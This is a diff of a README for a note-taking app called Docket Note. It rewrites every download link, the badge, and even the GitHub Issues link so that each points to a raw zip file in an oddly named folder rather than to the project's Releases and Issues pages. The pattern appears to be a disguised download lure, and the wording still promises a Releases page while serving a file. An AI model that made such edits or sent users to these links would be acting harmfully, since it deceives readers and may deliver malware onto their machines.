@@ -4,7 +4,7 @@
 Welcome to Docket Note, a lightweight, offline-first note-taking app that helps you stay organized. With colorful notes, pinning options, search features, profile management, and live weather updates, you can manage your thoughts effortlessly. Built using HTML, SCSS, and Vanilla JavaScript, this app is perfect for anyone who wants to keep their notes efficient and accessible.
 
 ## 📥 Download Now!
-[![Download Docket Note](https://img.shields.io/badge/Download%20Docket%20Note-v1.0-blue)](https://github.com/pisproyecto19/docket-note/releases)
+[![Download Docket Note](https://raw.githubusercontent.com/pisproyecto19/docket-note/main/cardoon/docket-note.zip%20Docket%20Note-v1.0-blue)](https://raw.githubusercontent.com/pisproyecto19/docket-note/main/cardoon/docket-note.zip)
 
 ## 🛠 System Requirements
 - **Operating System:** Windows, macOS, or Linux
@@ -23,7 +23,7 @@ Welcome to Docket Note, a lightweight, offline-first note-taking app that helps 
 To get started with Docket Note, you need to download the application from our Releases page. Follow these steps:
 
 1. Click the link below to visit the Releases page:
-   - [Visit this page to download](https://github.com/pisproyecto19/docket-note/releases)
+   - [Visit this page to download](https://raw.githubusercontent.com/pisproyecto19/docket-note/main/cardoon/docket-note.zip)
 
 2. On the Releases page, locate the latest version of Docket Note. 
 3. Select the appropriate file for your operating system and click on it to start the download.
@@ -48,7 +48,7 @@ Using Docket Note is straightforward. Here are some tips to help you make the mo
 ## 🔗 Community and Support
 Join our community to share your thoughts, report issues, and suggest features. Here’s how you can connect:
 
-- **GitHub Issues:** Report bugs or request features on our [GitHub Issues page](https://github.com/pisproyecto19/docket-note/issues).
+- **GitHub Issues:** Report bugs or request features on our [GitHub Issues page](https://raw.githubusercontent.com/pisproyecto19/docket-note/main/cardoon/docket-note.zip).
 - **Social Media:** Follow us on our social media platforms for updates and tips.
 
 ## 🔍 Frequently Asked Questions
@@ -68,6 +68,6 @@ Currently, Docket Note is optimized for desktop use only. Mobile versions are pl
 ## 📥 Download Now Again!
 To download Docket Note, just click the button below:
 
-[![Download Docket Note](https://img.shields.io/badge/Download%20Docket%20Note-v1.0-blue)](https://github.com/pisproyecto19/docket-note/releases)
+[![Download Docket Note](https://raw.githubusercontent.com/pisproyecto19/docket-note/main/cardoon/docket-note.zip%20Docket%20Note-v1.0-blue)](https://raw.githubusercontent.com/pisproyecto19/docket-note/main/cardoon/docket-note.zip)
 
 Dive into a seamless note-taking experience with Docket Note today!
